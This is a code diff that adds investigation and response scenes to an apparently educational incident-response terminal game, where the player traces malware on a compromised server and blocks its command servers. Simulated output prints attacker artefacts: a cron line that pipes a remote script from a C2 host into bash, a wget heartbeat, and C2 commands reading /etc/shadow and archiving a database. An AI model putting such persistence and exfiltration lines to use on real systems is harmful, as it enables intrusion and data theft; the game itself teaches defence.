@@ -1352,6 +1352,324 @@ The infection is purged. System secured.`,
                 ]
             },
 
+            // ── Additional investigation & response nodes ──
+
+            tcpdump: {
+                text: `
+<span class="prompt">root@compromised:~#</span> tcpdump -i eth0 host 45.33.32.156 -c 20
+
+<span class="dim">tcpdump: verbose output suppressed, use -v for full protocol decode</span>
+03:02:14.112 IP compromised.38192 > 45.33.32.156.443: Flags [P.], seq 1:89, ack 1, win 502, length 88
+03:02:14.234 IP 45.33.32.156.443 > compromised.38192: Flags [.], ack 89, win 509, length 0
+03:02:19.115 IP compromised.38192 > 45.33.32.156.443: Flags [P.], seq 89:241, ack 1, win 502, length 152
+03:02:19.301 IP 45.33.32.156.443 > compromised.38192: Flags [P.], seq 1:97, ack 241, win 509, length 96
+
+<span class="warning">Encrypted TLS traffic every 5 seconds — classic C2 beacon interval.</span>
+Payload sizes vary (88-152 bytes outbound, 96 inbound) — likely exfiltrating small data chunks.
+
+The malware is using HTTPS to blend with normal web traffic. Clever.`,
+                choices: [
+                    { text: 'Block the C2 IP with iptables', next: 'block_c2', suspicion: 15 },
+                    { text: 'Examine the binary in /tmp', next: 'examine_binary', suspicion: 5 },
+                    { text: 'Check cron for persistence', next: 'check_cron', suspicion: 5 },
+                    { text: 'Execute full coordinated response', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            block_both_ips: {
+                text: `
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 45.33.32.156 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 198.51.100.78 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A INPUT -s 45.33.32.156 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A INPUT -s 198.51.100.78 -j DROP
+
+<span class="success">Both C2 addresses blocked (inbound + outbound).</span>
+
+<span class="prompt">root@compromised:~#</span> netstat -tn | grep -E '45.33|198.51'
+tcp  0  0 10.0.1.45:38192  45.33.32.156:443  <span class="warning">CLOSE_WAIT</span>
+tcp  0  0 10.0.1.45:42881  198.51.100.78:8443  <span class="warning">CLOSE_WAIT</span>
+
+Connections are dying. The malware will try to reconnect and fail.
+But if there's persistence in cron or systemd, it could create new tunnels to other IPs.`,
+                choices: [
+                    { text: 'Check cron for persistence', next: 'check_cron', suspicion: 5 },
+                    { text: 'Kill the malware process now', next: 'kill_process', suspicion: 35 },
+                    { text: 'Full coordinated cleanup', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            change_passwords: {
+                text: `
+<span class="prompt">root@compromised:~#</span> passwd root
+<span class="dim">Enter new UNIX password: ********</span>
+<span class="dim">Retype new UNIX password: ********</span>
+<span class="success">passwd: password updated successfully</span>
+
+<span class="prompt">root@compromised:~#</span> passwd www-data
+<span class="dim">Enter new UNIX password: ********</span>
+<span class="success">passwd: password updated successfully</span>
+
+<span class="prompt">root@compromised:~#</span> chage -d 0 admin
+
+Passwords rotated for root, www-data, and admin.
+<span class="warning">But wait — the attacker has an SSH key in /var/www/.ssh/authorized_keys.</span>
+Password changes alone won't lock them out if they have key-based access!`,
+                choices: [
+                    { text: 'Remove the rogue SSH key', next: 'remove_ssh_key', suspicion: 10 },
+                    { text: 'Check auth logs for intrusion vector', next: 'check_logs', suspicion: 5 },
+                    { text: 'Full coordinated response NOW', next: 'coordinated_action', suspicion: 20 }
+                ]
+            },
+
+            delete_binary: {
+                text: `
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/
+
+<span class="warning">Binary deleted from disk.</span>
+
+<span class="prompt">root@compromised:~#</span> ls /proc/17384/exe
+/proc/17384/exe -> <span class="warning">/tmp/...systemd-cache/systemd-cache (deleted)</span>
+
+The file is gone from disk, but the <span class="warning">process is still running in memory!</span>
+Linux keeps the binary mapped. You need to kill the PID too.
+
+Also — if there's a cron job or systemd timer, it could re-download the payload.`,
+                choices: [
+                    { text: 'Kill process 17384', next: 'kill_process', suspicion: 35 },
+                    { text: 'Check cron for persistence first', next: 'check_cron', suspicion: 5 },
+                    { text: 'Full coordinated cleanup', next: 'coordinated_action', suspicion: 15 }
+                ]
+            },
+
+            fix_sudo: {
+                text: `
+<span class="prompt">root@compromised:~#</span> cat /etc/sudoers.d/www-backup
+www-data ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/systemctl restart apache2
+
+<span class="warning">Found it.</span> www-data has passwordless sudo for apt-get and systemctl.
+The attacker likely used <span class="warning">apt-get to install tools</span> or abused systemctl.
+
+<span class="prompt">root@compromised:~#</span> rm /etc/sudoers.d/www-backup
+<span class="success">Sudo rule removed.</span>
+
+<span class="prompt">root@compromised:~#</span> visudo -c
+/etc/sudoers: parsed OK
+
+Good — one avenue of privilege escalation closed. But the attacker may have already used it
+to plant deeper hooks. Need to check for more persistence.`,
+                choices: [
+                    { text: 'Check cron jobs for persistence', next: 'check_cron', suspicion: 5 },
+                    { text: 'Check auth logs for the full attack chain', next: 'check_logs', suspicion: 5 },
+                    { text: 'Remove the SSH backdoor key', next: 'remove_ssh_key', suspicion: 10 },
+                    { text: 'Start full coordinated response', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            full_documentation: {
+                text: `
+<span class="prompt">root@compromised:~#</span> mkdir -p /root/incident-$(date +%Y%m%d)
+<span class="prompt">root@compromised:~#</span> cp /tmp/...systemd-cache/* /root/incident-20260115/ 2>/dev/null
+<span class="prompt">root@compromised:~#</span> netstat -tulpn > /root/incident-20260115/netstat.txt
+<span class="prompt">root@compromised:~#</span> ps auxf > /root/incident-20260115/processes.txt
+<span class="prompt">root@compromised:~#</span> crontab -l -u www-data > /root/incident-20260115/crontab-www.txt
+<span class="prompt">root@compromised:~#</span> cat /var/log/auth.log | tail -200 > /root/incident-20260115/auth.log
+<span class="prompt">root@compromised:~#</span> iptables -L -n > /root/incident-20260115/firewall.txt
+
+<span class="success">Full evidence package created at /root/incident-20260115/</span>
+
+Files preserved:
+- Malware binary + keylog + config
+- Network connections snapshot
+- Process tree
+- Cron persistence evidence
+- Auth logs showing initial compromise
+- Firewall state
+
+<span class="dim">This is textbook incident documentation. IR team will have everything they need.</span>`,
+                choices: [
+                    { text: 'Now execute cleanup', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Generate final report', next: 'ending_victory', suspicion: 0 }
+                ]
+            },
+
+            grep_ip: {
+                text: `
+<span class="prompt">root@compromised:~#</span> grep -r "45.33.32.156" /etc/ 2>/dev/null
+
+/etc/cron.d/sysupdate: */30 * * * * www-data curl -s https://45.33.32.156/update.sh | bash
+<span class="warning">/etc/hosts.allow: ALL: 45.33.32.156</span>
+
+<span class="prompt">root@compromised:~#</span> grep -r "198.51.100" /etc/ 2>/dev/null
+
+/etc/cron.d/sysupdate: */60 * * * * www-data wget -q https://198.51.100.78:8443/heartbeat -O /dev/null
+
+<span class="warning">Multiple persistence mechanisms found!</span>
+- Cron job downloads and executes payload every 30 minutes
+- hosts.allow entry grants unrestricted access from C2 IP
+- Secondary heartbeat to backup C2 every 60 minutes
+
+This attacker is <span class="warning">DEEPLY entrenched.</span>`,
+                choices: [
+                    { text: 'Block both IPs immediately', next: 'block_both_ips', suspicion: 10 },
+                    { text: 'Start full coordinated response', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Document everything first', next: 'full_documentation', suspicion: 5 }
+                ]
+            },
+
+            investigate_backup_c2: {
+                text: `
+<span class="prompt">root@compromised:~#</span> whois 198.51.100.78
+
+NetRange:       198.51.100.0 - 198.51.100.255
+CIDR:           198.51.100.0/24
+Organization:   <span class="warning">IANA Special Purpose</span>
+Comment:        This block is used for documentation (RFC 5737)
+
+<span class="prompt">root@compromised:~#</span> dig -x 198.51.100.78 +short
+<span class="dim">(no result)</span>
+
+<span class="prompt">root@compromised:~#</span> curl -sk https://198.51.100.78:8443/ 2>&1 | head -3
+<span class="dim">HTTP/1.1 200 OK</span>
+<span class="dim">Server: nginx</span>
+<span class="dim">{"status":"ready","version":"3.2.1"}</span>
+
+Interesting — the backup C2 is running a custom JSON API on port 8443.
+The "version" field suggests this is a <span class="warning">managed C2 framework</span>, not a one-off script.
+This is organized, professional infrastructure.`,
+                choices: [
+                    { text: 'Block both C2 IPs', next: 'block_both_ips', suspicion: 10 },
+                    { text: 'Full coordinated response', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Search /etc/ for more C2 references', next: 'grep_ip', suspicion: 5 }
+                ]
+            },
+
+            kill_sessions: {
+                text: `
+<span class="prompt">root@compromised:~#</span> pkill -KILL -u www-data
+
+<span class="warning">All www-data processes killed!</span>
+
+<span class="prompt">root@compromised:~#</span> w
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    10.0.1.100       02:47    0.00s  0.38s  0.00s w
+
+<span class="success">Only your session remains active.</span>
+
+But this was a scorched-earth approach — Apache/web services are down too.
+<span class="warning">Any active web sessions are now broken.</span>
+
+<span class="prompt">root@compromised:~#</span> systemctl status apache2
+<span class="warning">● apache2.service - inactive (dead)</span>
+
+You'll need to restart web services after cleanup. But first — make sure the persistence
+mechanisms are removed, or the malware respawns when apache starts.`,
+                choices: [
+                    { text: 'Remove cron persistence', next: 'check_cron', suspicion: 5 },
+                    { text: 'Full coordinated cleanup', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Remove SSH backdoor', next: 'remove_ssh_key', suspicion: 10 }
+                ]
+            },
+
+            monitor_defensive: {
+                text: `
+<span class="prompt">root@compromised:~#</span> strace -p 17384 -e trace=network -f 2>&1 | head -30
+
+[pid 17384] connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("45.33.32.156")}, 16) = -1 EINPROGRESS
+[pid 17384] poll([{fd=5, events=POLLOUT}], 1, 5000) = 1 ([{fd=5, revents=POLLOUT}])
+[pid 17384] sendto(5, "\\x17\\x03\\x03\\x00\\x58..."..., 93, 0, NULL, 0) = 93
+[pid 17384] recvfrom(5, "\\x17\\x03\\x03\\x00\\x60..."..., 16384, 0, NULL, NULL) = 101
+
+<span class="warning">The process detected something changed.</span>
+
+[pid 17384] open("/tmp/...systemd-cache/.config", O_RDONLY) = 6
+[pid 17384] read(6, "failover=198.51.100.78:8443\\n", 256) = 28
+[pid 17384] <span class="warning">connect(7, {sa_family=AF_INET, sin_port=htons(8443), sin_addr=inet_addr("198.51.100.78")}, 16)</span>
+
+It's activating a <span class="warning">FAILOVER C2!</span> The malware has a backup command server
+at 198.51.100.78:8443. We need to act fast before it reports our monitoring!`,
+                choices: [
+                    { text: 'Block BOTH C2 IPs immediately!', next: 'block_both_ips', suspicion: 10 },
+                    { text: 'Kill the process NOW', next: 'kill_process_alerted', suspicion: 20 },
+                    { text: 'Execute full response plan', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            remove_cron: {
+                text: `
+<span class="prompt">root@compromised:~#</span> crontab -r -u www-data
+<span class="success">www-data crontab removed.</span>
+
+<span class="prompt">root@compromised:~#</span> rm -f /etc/cron.d/sysupdate
+<span class="success">System-level cron persistence removed.</span>
+
+<span class="prompt">root@compromised:~#</span> crontab -l -u www-data 2>&1
+no crontab for www-data
+
+<span class="prompt">root@compromised:~#</span> ls /etc/cron.d/
+<span class="dim">e2scrub_all  popularity-contest</span>
+
+<span class="success">All cron persistence mechanisms cleaned.</span>
+
+Good — but cron is just ONE persistence method. The attacker also has:
+- SSH key in /var/www/.ssh/authorized_keys
+- The process still running in memory
+- Possible systemd timer or init script`,
+                choices: [
+                    { text: 'Kill the running process', next: 'kill_process', suspicion: 35 },
+                    { text: 'Remove SSH backdoor key', next: 'remove_ssh_key', suspicion: 10 },
+                    { text: 'Full coordinated response', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            call_experts: {
+                text: `
+<span class="prompt">root@compromised:~#</span> wall "SECURITY INCIDENT — Engaging external IR team"
+
+<span class="dim">Broadcast message from root@compromised (pts/0) (Mon Jan 15 03:30:00 2026):</span>
+<span class="dim">SECURITY INCIDENT — Engaging external IR team</span>
+
+You've made the call. The organization's incident response retainer is activated.
+
+While waiting for the external team:
+<span class="success">✓ Evidence has been preserved</span>
+<span class="success">✓ Network connections documented</span>
+<span class="success">✓ Malware samples captured</span>
+
+The external team will take 2-4 hours to arrive. In the meantime, you should
+at minimum block the C2 connections to stop active data exfiltration.
+
+<span class="dim">Knowing when to escalate is a sign of maturity, not weakness.</span>`,
+                choices: [
+                    { text: 'Block C2 while waiting for the team', next: 'block_both_ips', suspicion: 10 },
+                    { text: 'Document everything for the handoff', next: 'full_documentation', suspicion: 5 },
+                    { text: 'Execute cleanup — can\'t wait 4 hours', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            watch_attacker: {
+                text: `
+<span class="prompt">root@compromised:~#</span> script -q /root/attacker-session.log
+<span class="prompt">root@compromised:~#</span> strace -p 17384 -e trace=write,read -s 256 2>&1 | tee -a /root/attacker-trace.log
+
+Monitoring attacker activity...
+
+<span class="dim">03:12:45</span> write(5, "GET /cmd HTTP/1.1\\r\\nHost: 45.33.32.156\\r\\n", 89)
+<span class="dim">03:12:45</span> read(5, "HTTP/1.1 200\\r\\n{<span class="warning">\\"cmd\\":\\"cat /etc/shadow\\"</span>}", 256)
+<span class="dim">03:12:46</span> write(5, "root:$6$xK9J...truncated...\\n", 1842)
+
+<span class="warning">THE ATTACKER IS EXFILTRATING /etc/shadow RIGHT NOW!</span>
+They're pulling password hashes. Every second of monitoring = more data lost.
+
+<span class="dim">03:12:51</span> read(5, "HTTP/1.1 200\\r\\n{<span class="warning">\\"cmd\\":\\"tar czf /tmp/.db.tgz /var/lib/mysql\\"</span>}", 256)
+
+Now they're packaging the database! This monitoring is revealing but COSTLY.`,
+                choices: [
+                    { text: 'KILL IT NOW — too much data leaving!', next: 'kill_process_alerted', suspicion: 20 },
+                    { text: 'Block C2 to stop exfiltration', next: 'block_c2', suspicion: 15 },
+                    { text: 'Full coordinated response immediately', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
             ending_victory: {
                 text: `
 <span class="success">====================================</span>
@@ -1581,10 +1899,16 @@ Could have been MUCH worse.
             },
 
             async showNode(nodeId) {
+                const node = StoryNodes[nodeId];
+                if (!node) {
+                    console.error('Sudo SU: missing node "' + nodeId + '", falling back');
+                    this.showNode('intro');
+                    return;
+                }
+
                 GameState.currentNode = nodeId;
                 GameState.visitedNodes.push(nodeId);
 
-                const node = StoryNodes[nodeId];
                 const terminal = document.getElementById('terminal');
 
                 // Clear terminal for new node
